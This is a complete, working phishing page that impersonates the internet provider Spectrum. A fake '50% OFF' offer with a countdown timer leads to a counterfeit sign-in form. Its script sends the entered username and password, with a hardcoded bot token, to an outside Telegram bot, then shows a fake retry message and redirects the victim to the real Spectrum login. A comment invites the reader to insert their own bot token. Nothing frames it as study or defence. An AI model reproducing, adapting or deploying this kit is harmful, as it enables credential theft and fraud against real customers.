<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spectrum Special Offer</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #004b87, #007acc);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }
        .offer-box {
            background: rgba(255,255,255,0.95);
            color: #000;
            border-radius: 16px;
            padding: 30px;
            max-width: 420px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
        }
        .offer-box img {
            width: 160px;
            margin-bottom: 20px;
        }
        h1 { font-size: 2rem; color: #004b87; margin-bottom: 15px; }
        .discount {
            font-size: 3.5rem;
            font-weight: bold;
            color: #e63946;
            margin: 15px 0;
        }
        .timer {
            background: #000;
            color: #fff;
            padding: 12px;
            border-radius: 8px;
            font-size: 1.1rem;
            margin: 20px 0;
        }
        .claim-btn {
            background: #e63946;
            color: #fff;
            font-size: 1.4rem;
            font-weight: bold;
            padding: 16px 40px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 8px 20px rgba(230,57,70,0.4);
        }
        .claim-btn:hover { background: #d62839; }
        .fake-login {
            display: none;
            background: #fff;
            color: #333;
            min-height: 100vh;
            padding: 40px 20px;
        }
        .login-box {
            background: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            max-width: 380px;
            margin: 0 auto;
        }
        .login-box img {
            width: 150px;
            display: block;
            margin: 0 auto 30px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 1rem;
        }
        .login-btn {
            background: #004b87;
            color: #fff;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 1.1rem;
            width: 100%;
            cursor: pointer;
        }
        .msg { margin-top: 15px; font-weight: bold; color: #28a745; }
    </style>
</head>
<body>

<!-- Page 1: Alluring Offer -->
<div id="offer-page">
    <div class="offer-box">
        <img src="https://spectrum.com/etc.clientlibs/charter/clientlibs/clientlib-site/resources/images/spectrum-logo.svg" alt="Spectrum">
        <h1>Congratulations!</h1>
        <div class="discount">50% OFF</div>
        <p style="font-size:1.3rem;">Your First 12 Months</p>
        <div class="timer">Offer Ends In: <span id="countdown">23:59:59</span></div>
        <p>Limited spots available in your area!</p>
        <button class="claim-btn" onclick="showLogin()">Claim Offer Now →</button>
        <p style="margin-top:20px;font-size:0.8rem;color:#666;">Log in to activate your discount</p>
    </div>
</div>

<!-- Page 2: Fake Login + Telegram Capture -->
<div id="fake-login" class="fake-login">
    <div class="login-box">
        <img src="https://spectrum.com/etc.clientlibs/charter/clientlibs/clientlib-site/resources/images/spectrum-logo.svg" alt="Spectrum">
        <form onsubmit="capture(event)">
            <input type="text" id="user" placeholder="Username or Email" required autocomplete="username">
            <input type="password" id="pass" placeholder="Password" required autocomplete="current-password">
            <button type="submit" class="login-btn">Sign In to Claim Offer</button>
            <div class="msg" id="msg"></div>
        </form>
    </div>
</div>

<script>
    // Countdown timer
    let time = 24*3600 - 1;
    setInterval(() => {
        time--;
        let h = Math.floor(time / 3600);
        let m = Math.floor((time % 3600) / 60);
        let s = time % 60;
        document.getElementById('countdown').textContent = 
            `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
    }, 1000);

    function showLogin() {
        document.getElementById('offer-page').style.display = 'none';
        document.getElementById('fake-login').style.display = 'block';
    }

    function capture(e) {
        e.preventDefault();
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        // SEND TO @resxge
        const botToken = '8574699564:AAFnQPZDe1-6AulpK82gXX1BBiucTU6AJ9k'; // ← CHANGE THIS TO YOUR BOT TOKEN
        const message = `NEW SPECTRUM CREDENTIALS\nUser: ${user}\nPass: ${pass}\nTime: ${new Date().toLocaleString('en-GB')}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: '@spectrumhak_bot',
                text: message
            })
        });

        // Show fake message then redirect
        document.getElementById('msg').textContent = 'Please enter your details again to verify...';
        setTimeout(() => {
            window.location.href = 'https://www.spectrum.net/login';
        }, 2500);
    }
</script>
</body>
</html>
